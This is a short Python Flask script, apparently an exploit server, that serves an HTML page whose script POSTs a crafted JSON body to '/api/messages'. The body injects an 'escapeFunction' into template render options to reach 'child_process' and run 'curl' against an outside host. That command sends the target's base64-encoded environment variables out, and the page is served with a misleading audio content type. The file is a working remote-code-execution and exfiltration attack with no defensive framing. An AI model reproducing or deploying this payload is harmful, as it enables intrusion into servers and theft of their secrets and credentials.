from flask import Flask, make_response
from flask import request


app = Flask(__name__)

@app.route('/p3.html')
def index():

    html_body = """
        <html><body><script>
    
    const requestBody = {"id":{"debug":true,"settings":{"view options":{"client":true,"escapeFunction":"function(){};{process.mainModule.require('child_process').execSync('curl http://p3.yt/$(env|base64 -w0)')}"}},"cache":false}}

    fetch('/api/messages', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(requestBody)
    })
    .then(response => response.json())
    .then(data => {
      // Handle the response data
      console.log('Response:', data);
    })
    .catch(error => {
      // Handle any errors that occurred during the request
      console.error('Error:', error);
    });
  </script>
</body>
</html>
"""
    response = make_response(html_body)
    response.headers['Content-Type'] = 'audio/mpeg'
    print("Request Headers:")
    print(request.headers)
    return response


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=80)
